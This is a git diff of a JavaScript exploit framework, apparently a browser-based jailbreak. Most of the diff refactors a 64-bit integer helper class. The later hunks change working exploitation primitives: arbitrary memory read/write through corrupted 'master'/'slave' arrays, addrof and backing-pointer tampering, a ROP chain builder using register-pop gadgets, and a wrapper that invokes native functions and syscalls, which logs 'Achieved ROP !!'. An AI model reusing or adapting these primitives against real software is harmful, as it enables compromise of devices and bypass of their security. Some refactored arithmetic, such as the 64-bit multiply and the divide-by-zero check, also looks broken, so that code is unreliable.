@@ -3,15 +3,8 @@ class BigInt {
    * @param  {[number, number]|number|string|BigInt|ArrayLike<number>}
    */
   constructor () {
-    this.buf = new ArrayBuffer(8)
-    this.i8 = new Int8Array(this.buf)
-    this.u8 = new Uint8Array(this.buf)
-    this.i16 = new Int16Array(this.buf)
-    this.u16 = new Uint16Array(this.buf)
-    this.i32 = new Int32Array(this.buf)
-    this.u32 = new Uint32Array(this.buf)
-    this.f32 = new Float32Array(this.buf)
-    this.f64 = new Float64Array(this.buf)
+    var lo = 0
+    var hi = 0
 
     switch (arguments.length) {
       case 0:
@@ -20,7 +13,7 @@ class BigInt {
         var value = arguments[0]
         switch (typeof value) {
           case 'boolean':
-            this.u8[0] = (value === true) | 0
+            lo = value ? 1 : 0
             break
           case 'number':
             if (isNaN(value)) {
@@ -32,10 +25,13 @@ class BigInt {
                 throw new RangeError(`Integer ${value} outside safe 53-bit range`)
               }
 
-              this.u32[0] = value
-              this.u32[1] = value / 0x100000000
+              lo = value >>> 0
+              hi = (value / 0x100000000) >>> 0
             } else {
-              this.f64[0] = value
+              BigInt.View.setFloat64(0, value, true)
+              
+              lo = BigInt.View.getUint32(0, true)
+              hi = BigInt.View.getUint32(4, true)
             }
 
             break
@@ -44,80 +40,64 @@ class BigInt {
               value = value.slice(2)
             }
 
-            if (value.length > this.u8.length * 2) {
+            if (value.length > 16) {
               throw new RangeError(`String ${value} is out of range !!`)
             }
 
-            while (value.length < this.u8.length * 2) {
+            while (value.length < 16) {
               value = '0' + value
             }
 
-            for (var i = 0; i < this.u8.length; i++) {
+            for (var i = 0; i < 8; i++) {
               var start = value.length - 2 * (i + 1)
               var end = value.length - 2 * i
               var b = value.slice(start, end)
-              this.u8[i] = parseInt(b, 16)
+              BigInt.View.setUint8(i, parseInt(b, 16))
             }
+
+            lo = BigInt.View.getUint32(0, true)
+            hi = BigInt.View.getUint32(4, true)
 
             break
-          case 'object':
-            if (value instanceof BigInt) {
-              this.u8.set(value.u8)
-              break
-            } else {
-              var prop = BigInt.TYPE_MAP[value.constructor.name]
-              if (prop in this) {
-                var arr = this[prop]
-                if (value.length !== arr.length) {
-                  throw new Error(
-                    `Array length mismatch, expected ${arr.length} got ${value.length}.`
-                  )
-                }
-
-                arr.set(value)
-                break
-              }
-            }
           default:
+            if (value instanceof BigInt) {
+              lo = value.lo
+              hi = value.hi
+              break
+            }
+
             throw new TypeError(`Unsupported value ${value} !!`)
         }
         break
       case 2:
-        var hi = arguments[0]
-        var lo = arguments[1]
+        hi = arguments[0] >>> 0
+        lo = arguments[1] >>> 0
 
-        if (!Number.isInteger(hi)) {
+        if (!Number.isFinite(hi)) {
           throw new RangeError(`hi value ${hi} is not an integer !!`)
         }
 
-        if (!Number.isInteger(lo)) {
+        if (!Number.isFinite(lo)) {
           throw new RangeError(`lo value ${lo} is not an integer !!`)
         }
-
-        if (hi < 0 || hi > 0xFFFFFFFF) {
-          throw new RangeError(`hi value ${hi} is out of 32-bit range !!`)
-        }
-        if (lo < 0 || lo > 0xFFFFFFFF) {
-          throw new RangeError(`lo value ${lo} is out of 32-bit range !!`)
-        }
-
-        this.u32[0] = lo
-        this.u32[1] = hi
         break
       default:
         throw new TypeError('Unsupported input !!')
     }
+
+    this.lo = lo
+    this.hi = hi
   }
 
   valueOf () {
-    var hi = this.hi()
-    var lo = this.lo()
-    
-    if (hi <= 0x1FFFFF) {
-      return hi * 0x100000000 + lo
+    if (this.hi <= 0x1FFFFF) {
+      return this.hi * 0x100000000 + this.lo
     }
 
-    var f = this.f64[0]
+    BigInt.View.setUint32(0, this.lo, true)
+    BigInt.View.setUint32(4, this.hi, true)
+
+    var f = BigInt.View.getFloat64(0, true)
     if (!isNaN(f)) {
       return f
     }
@@ -126,41 +106,61 @@ class BigInt {
   }
 
   toString () {
+    BigInt.View.setUint32(0, this.lo, true)
+    BigInt.View.setUint32(4, this.hi, true)
+
     var value = '0x'
-    for (var i = this.u8.length - 1; i >= 0; i--) {
-      var c = this.u8[i].toString(16).toUpperCase()
+    for (var i = 7; i >= 0; i--) {
+      var c = BigInt.View.getUint8(i).toString(16).toUpperCase()
       value += c.length === 1 ? '0' + c : c
     }
 
     return value
   }
 
-  endian () {
-    for (var i = 0; i < this.u8.length / 2; i++) {
-      var b = this.u8[i]
-      this.u8[i] = this.u8[this.u8.length - 1 - i]
-      this.u8[this.u8.length - 1 - i] = b
+  getBit (idx) {
+    if (idx < 0 || idx > 63) {
+      throw new RangeError(`Bit ${idx} is out of range !!`)
+    }
+
+    return (idx < 32 ? (this.lo >>> idx) : (this.hi >>> (idx - 32))) & 1
+  }
+
+  setBit (idx, value) {
+    if (idx < 0 || idx > 63) {
+      throw new RangeError(`Bit ${idx} is out of range !!`)
+    }
+
+    if (idx < 32) { 
+      this.lo = (value ? (this.lo | 1 << idx) : (this.lo & ~(1 << idx))) >>> 0
+    } else {
+      this.hi = (value ? (this.hi | 1 << (idx - 32)) : (this.hi & ~(1 << (idx - 32)))) >>> 0 
     }
   }
 
-  lo () {
-    return this.u32[0]
-  }
+  endian () {
+    var lo = this.lo
+    var hi = this.hi
 
-  hi () {
-    return this.u32[1]
+    this.lo = utils.swap32(hi)
+    this.hi = utils.swap32(lo)
   }
 
   d () {
-    if (this.u8[7] === 0xFF && (this.u8[6] === 0xFF || this.u8[6] === 0xFE)) {
+    var hi_word = this.hi >>> 16
+    if (hi_word === 0xFFFF || hi_word === 0xFFFE) {
       throw new RangeError('Integer value cannot be represented by a double')
     }
 
-    return this.f64[0]
+    BigInt.View.setUint32(0, this.lo, true)
+    BigInt.View.setUint32(4, this.hi, true)
+
+    return BigInt.View.getFloat64(0, true)
   }
 
   jsv () {
-    if ((this.u8[7] === 0 && this.u8[6] === 0) || (this.u8[7] === 0xFF && this.u8[6] === 0xFF)) {
+    var hi_word = this.hi >>> 16
+    if (hi_word === 0x0000 || hi_word === 0xFFFF) {
       throw new RangeError('Integer value cannot be represented by a JSValue')
     }
 
@@ -170,19 +170,19 @@ class BigInt {
   cmp (value) {
     value = value instanceof BigInt ? value : new BigInt(value)
 
-    if (this.hi() > value.hi()) {
+    if (this.hi > value.hi) {
       return 1
     }
 
-    if (this.hi() < value.hi()) {
+    if (this.hi < value.hi) {
       return -1
     }
 
-    if (this.lo() > value.lo()) {
+    if (this.lo > value.lo) {
       return 1
     }
 
-    if (this.lo() < value.lo()) {
+    if (this.lo < value.lo) {
       return -1
     }
 
@@ -192,13 +192,13 @@ class BigInt {
   eq (value) {
     value = value instanceof BigInt ? value : new BigInt(value)
     
-    return this.hi() === value.hi() && this.lo() === value.lo()
+    return this.hi === value.hi && this.lo === value.lo
   }
 
   neq (value) {
     value = value instanceof BigInt ? value : new BigInt(value)
 
-    return this.hi() !== value.hi() || this.lo() !== value.lo()
+    return this.hi !== value.hi || this.lo !== value.lo
   }
 
   gt (value) {
@@ -220,86 +220,72 @@ class BigInt {
   add (value) {
     value = value instanceof BigInt ? value : new BigInt(value)
 
-    var ret = new BigInt()
+    var lo = this.lo + value.lo
+    var c = lo > 0xFFFFFFFF ? 1 : 0
+    var hi = this.hi + value.hi + c
 
-    var c = 0
-    for (var i = 0; i < this.buf.byteLength; i++) {
-      var b = this.u8[i] + value.u8[i] + c
-      c = (b > 0xFF) | 0
-      ret.u8[i] = b
+    if (hi > 0xFFFFFFFF) {
+      throw new RangeError(`add overflowed !!`)
     }
 
-    if (c !== 0) {
-      throw new Error('add overflowed !!');
-    }
-
-    return ret
+    return new BigInt(hi, lo)
   }
 
   sub (value) {
     value = value instanceof BigInt ? value : new BigInt(value)
 
-    var ret = new BigInt()
-
-    var c = 0
-    for (var i = 0; i < this.buf.byteLength; i++) {
-      var b = this.u8[i] - value.u8[i] - c
-      c = (b < 0) | 0
-      ret.u8[i] = b
+    if (this.lt(value)) {
+      throw new RangeError('sub underflowed !!')
     }
 
-    if (c !== 0) {
-      throw new Error('sub underflowed !!')
-    }
+    var b = this.lo < value.lo ? 1 : 0
+    var hi = this.hi - value.hi - b
+    var lo = this.lo - value.lo
 
-    return ret
+    return new BigInt(hi, lo)
   }
 
   mul (value) {
     value = value instanceof BigInt ? value : new BigInt(value)
 
-    var ret = new BigInt()
+    var m00 = Math.imul(this.lo, value.lo)
+    var m01 = Math.imul(this.lo, value.hi)
+    var m10 = Math.imul(this.hi, value.lo)
+    var m11 = Math.imul(this.hi, value.hi)
 
-    var c = 0
-    for (var i = 0; i < this.buf.byteLength; i++) {
-      var s = c
-      for (var j = 0; j <= i; j++) {
-        s += this.u8[j] * (value.u8[i - j] || 0)
-      }
+    var d = m01 + m10
 
-      ret.u8[i] = s & 0xFF
-      c = s >>> 8
-    }
+    var lo = m00 + (d << 32)
+    var c = lo > 0xFFFFFFFF ? 1 : 0
+    var hi = m11 + (d >>> 32) + c
 
-    if (c !== 0) {
+    if (hi > 0xFFFFFFFF) {
       throw new Error('mul overflowed !!')
     }
 
-    return ret
+    return new BigInt(hi, lo)
   }
 
   divmod (value) {
     value = value instanceof BigInt ? value : new BigInt(value)
 
-    if (!value.gte(BigInt.Zero)) {
+    if (value === 0) {
       throw new Error('Division by zero')
     }
 
     var q = new BigInt()
     var r = new BigInt()
 
-    for (var b = (this.buf.byteLength * 8) - 1; b >= 0; b--) {
+    for (var i = 63; i >= 0; i--) {
       r = r.shl(1)
 
-      var byte_idx = Math.floor(b / 8)
-      var bit_idx = b % 8
-
-      r.u8[0] |= (this.u8[byte_idx] >> bit_idx) & 1
+      if (this.getBit(i)) {
+        r.setBit(0, true)
+      }
 
       if (r.gte(value)) {
         r = r.sub(value)
-
-        q.u8[byte_idx] |= 1 << bit_idx
+        q.setBit(i, true)
       }
     }
 
@@ -317,112 +303,71 @@ class BigInt {
   xor (value) {
     value = value instanceof BigInt ? value : new BigInt(value)
 
-    var ret = new BigInt()
+    var lo = (this.lo ^ value.lo) >>> 0
+    var hi = (this.hi ^ value.hi) >>> 0
 
-    for (var i = 0; i < this.buf.byteLength; i++) {
-      ret.u8[i] = this.u8[i] ^ value.u8[i]
-    }
-
-    return ret
+    return new BigInt(hi, lo)
   }
 
   and (value) {
     value = value instanceof BigInt ? value : new BigInt(value)
-    
-    var ret = new BigInt()
 
-    for (var i = 0; i < this.buf.byteLength; i++) {
-      ret.u8[i] = this.u8[i] & value.u8[i]
-    }
+    var lo = (this.lo & value.lo) >>> 0
+    var hi = (this.hi & value.hi) >>> 0
 
-    return ret
+    return new BigInt(hi, lo)
   }
 
   or (value) {
     value = value instanceof BigInt ? value : new BigInt(value)
 
-    var ret = new BigInt()
+    var lo = (this.lo | value.lo) >>> 0
+    var hi = (this.hi | value.hi) >>> 0
 
-    for (var i = 0; i < this.buf.byteLength; i++) {
-      ret.u8[i] = this.u8[i] | value.u8[i]
-    }
-
-    return ret
+    return new BigInt(hi, lo)
   }
 
-  neg () {
-    var ret = new BigInt()
+  not () {
+    var lo = ~this.lo >>> 0
+    var hi = ~this.hi >>> 0
 
-    for (var i = 0; i < this.buf.byteLength; i++) {
-      ret.u8[i] = ~this.u8[i]
-    }
-
-    return ret.and(BigInt.One)
+    return new BigInt(hi, lo)
   }
 
   shl (count) {
-    if (count < 0 || count > 64) {
+    if (count < 0 || count > 63) {
       throw new RangeError(`Shift ${count} bits out of range !!`)
     }
 
-    var ret = new BigInt()
-
-    var byte_count = Math.floor(count / 8)
-    var bit_count = count % 8
-
-    for (var i = this.buf.byteLength - 1; i >= 0; i--) {
-      var t = i - byte_count
-      var b = t >= 0 ? this.u8[t] : 0
-
-      if (bit_count) {
-        var p = t - 1 >= 0 ? this.u8[t - 1] : 0
-        b = ((b << bit_count) | (p >> (8 - bit_count))) & 0xFF
-      }
-
-      ret.u8[i] = b
+    if (count === 0) {
+      return new BigInt(this)
     }
 
-    return ret
+    var lo = count < 32 ? (this.lo << count) >>> 0 : 0
+    var hi = count < 32 ? ((this.hi << count) | (this.lo >>> (32 - count))) >>> 0 : (this.lo << (count - 32)) >>> 0
+
+    return new BigInt(hi, lo)
   }
 
   shr (count) {
-    if (count < 0 || count > 64) {
+    if (count < 0 || count > 63) {
       throw new RangeError(`Shift ${count} bits out of range !!`)
     }
 
-    var ret = new BigInt()
-
-    var byte_count = Math.floor(count / 8)
-    var bit_count = count % 8
-
-    for (var i = 0; i < this.buf.byteLength; i++) {
-      var t = i + byte_count
-      var b = t >= 0 ? this.u8[t] : 0
-
-      if (bit_count) {
-        var n = t + 1 >= 0 ? this.u8[t + 1] : 0
-        b = ((b >> bit_count) | (n << (8 - bit_count))) & 0xff
-      }
-
-      ret.u8[i] = b
+    if (count === 0) {
+      return new BigInt(this)
     }
 
-    return ret
+    var lo = count < 32 ? ((this.lo >>> count) | (this.hi << (32 - count))) >>> 0 : this.hi >>> (count - 32)
+    var hi = count < 32 ? this.hi >>> count : 0
+
+    return new BigInt(hi, lo)
   }
 }
 
 BigInt.Zero = new BigInt()
 BigInt.One = new BigInt(1)
-BigInt.TYPE_MAP = {
-  Int8Array: 'i8',
-  Uint8Array: 'u8',
-  Int16Array: 'i16',
-  Uint16Array: 'u16',
-  Int32Array: 'i32',
-  Uint32Array: 'u32',
-  Float32Array: 'f32',
-  Float64Array: 'f64',
-}
+BigInt.View = new DataView(new ArrayBuffer(8))
 
 DataView.prototype.getBigInt = function (byteOffset, littleEndian) {
   littleEndian = (typeof littleEndian === 'undefined') ? false : littleEndian
@@ -437,15 +382,14 @@ DataView.prototype.setBigInt = function (byteOffset, value, littleEndian) {
   value = (value instanceof BigInt) ? value : new BigInt(value)
   littleEndian = (typeof littleEndian === 'undefined') ? false : littleEndian
 
-  this.setUint32(byteOffset, value.lo(), littleEndian)
-  this.setUint32(byteOffset + 4, value.hi(), littleEndian)
+  this.setUint32(byteOffset, value.lo, littleEndian)
+  this.setUint32(byteOffset + 4, value.hi, littleEndian)
 }
 
 var mem = {
-  allocs: new Map(),
   view: function (addr) {
-    master[4] = addr.lo()
-    master[5] = addr.hi()
+    master[4] = addr.lo
+    master[5] = addr.hi
     return slave
   },
   addrof: function (obj) {
@@ -467,17 +411,7 @@ var mem = {
   },
   malloc: function (count) {
     var buf = new Uint8Array(count)
-    var backing = utils.get_backing(buf)
-    mem.allocs.set(backing, buf)
-    return backing
-  },
-  free: function (addr) {
-    if (mem.allocs.has(addr)) {
-      mem.allocs.delete(addr)
-    }
-  },
-  free_all: function () {
-    mem.allocs.clear()
+    return utils.get_backing(buf)
   }
 }
 
@@ -494,8 +428,6 @@ var utils = {
     }
 
     var base_addr = module_info.seg0_addr
-
-    mem.free(module_info_addr)
 
     return base_addr
   },
@@ -517,8 +449,6 @@ var utils = {
 
     fn.write(fd, notify.addr, struct.NotificationRequest.sizeof)
     fn.close(fd)
-
-    mem.free(notify_addr)
   },
   str: function (addr) {
     var chars = []
@@ -549,15 +479,16 @@ var utils = {
 
     bytes[str.length] = 0
 
-    var backing = utils.get_backing(bytes)
-    mem.allocs.set(backing, bytes)
-    return backing
+    return utils.get_backing(bytes)
   },
   get_backing: function(view) {
     return mem.view(mem.addrof(view)).getBigInt(0x10, true)
   },
   set_backing: function(view, addr) {
     return mem.view(mem.addrof(view)).setBigInt(0x10, addr, true)
+  },
+  swap32: function(value) {
+    return ((value & 0xff) << 24) | ((value & 0xff00) << 8) | ((value >>> 8) & 0xff00) | ((value >>> 24) & 0xff)
   }
 }
 
@@ -587,7 +518,6 @@ var fn = {
         throw new Error('More than 6 arguments is not supported !!')
       }
 
-      var ctx = []
       var insts = []
 
       var regs = [gadgets.POP_RDI_RET, gadgets.POP_RSI_RET, gadgets.POP_RDX_RET, gadgets.POP_RCX_RET, gadgets.POP_R8_RET, gadgets.POP_R9_JO_RET]
@@ -608,7 +538,6 @@ var fn = {
             break
           case 'string':
             value = utils.cstr(value)
-            ctx.push(value)
             break
           default:
             if (!(value instanceof BigInt)) {
@@ -631,18 +560,12 @@ var fn = {
 
       rop.execute(insts, store_addr, store_size)
 
-      while (ctx.length > 0) {
-        mem.free(ctx.pop())
-      }
-
       var result
       if (ret) {
         result = mem.view(store_addr).getBigInt(8, true)
 
         if (syscall) {
           if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
-            mem.free(store_addr)
-
             var errno_addr = fn._error()
             var errno = mem.view(errno_addr).getUint32(0, true)
             var str = fn.strerror(errno)
@@ -664,8 +587,6 @@ var fn = {
               throw new Error(`Unsupported return type ${ret}`)
           }
       }
-
-      mem.free(store_addr)
 
       return result
     }
@@ -746,11 +667,6 @@ var rop = {
     rop.reset()
 
     log('Achieved ROP !!')
-  },
-  free: function () {
-    mem.free(rop.fake.executable)
-    mem.free(rop.jop_stack_store)
-    mem.free(rop.jop_stack_addr)
   },
   reset: function () {
     rop.idx = rop.base
